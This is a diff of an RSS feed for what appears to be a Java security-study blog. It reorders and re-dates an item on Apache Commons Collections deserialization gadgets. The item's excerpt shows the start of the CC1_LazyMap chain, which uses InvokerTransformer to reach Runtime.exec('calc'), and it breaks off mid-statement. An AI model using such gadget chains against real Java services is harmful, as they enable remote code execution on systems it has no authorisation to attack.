@@ -51,6 +51,13 @@ encrypt()
 import base64 import uuid from Crypto.</description>
     </item>
     <item>
+      <title>commons-collections</title>
+      <link>https://neryx.github.io/docs/java/javagadget/commons-collections/</link>
+      <pubDate>Thu, 30 Nov 2023 02:00:20 +0800</pubDate>
+      <guid>https://neryx.github.io/docs/java/javagadget/commons-collections/</guid>
+      <description>CC chain CC1_LazyMap import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC1_LazyMap { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&amp;#34;getMethod&amp;#34;,new Class[]{String.class,Class[].class},new Object[]{&amp;#34;getRuntime&amp;#34;,null}), new InvokerTransformer(&amp;#34;invoke&amp;#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&amp;#34;exec&amp;#34;,new Class[]{String.class},new Object[]{&amp;#34;calc&amp;#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&amp;lt;Object,Object&amp;gt; map = new HashMap&amp;lt;&amp;gt;(); Map&amp;lt;Object,Object&amp;gt; lazyMap = LazyMap.</description>
+    </item>
+    <item>
       <title>CC3</title>
       <link>https://neryx.github.io/docs/java/javagadget/cc3/</link>
       <pubDate>Mon, 20 Nov 2023 02:00:20 +0800</pubDate>
@@ -160,13 +167,6 @@ java源文件 -&amp;gt; class字节码文件 -&amp;gt; java运行class文件jav
 public class HelloWord { // 与文件名一致 public static void main(String[] args) { // 主函数 System.out.println(&amp;#34;Hello World&amp;#34;); } } 主函数
 public static void main(String[] args){ } 输入输出
 输入 import java.util.Scanner Scanner sc = new Scanner(System.in); int q = sc.nextInt(); String c = sc.next(); 输出 System.out.println(值); // 换行 sout // 匹配 System.out.print(值); // 不换行 注释</description>
-    </item>
-    <item>
-      <title>commons-collections</title>
-      <link>https://neryx.github.io/docs/java/javagadget/commons-collections/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://neryx.github.io/docs/java/javagadget/commons-collections/</guid>
-      <description>CC chain CC1_LazyMap import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC1_LazyMap { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&amp;#34;getMethod&amp;#34;,new Class[]{String.class,Class[].class},new Object[]{&amp;#34;getRuntime&amp;#34;,null}), new InvokerTransformer(&amp;#34;invoke&amp;#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&amp;#34;exec&amp;#34;,new Class[]{String.class},new Object[]{&amp;#34;calc&amp;#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&amp;lt;Object,Object&amp;gt; map = new HashMap&amp;lt;&amp;gt;(); Map&amp;lt;Object,Object&amp;gt; lazyMap = LazyMap.</description>
     </item>
     <item>
       <title>Search</title>
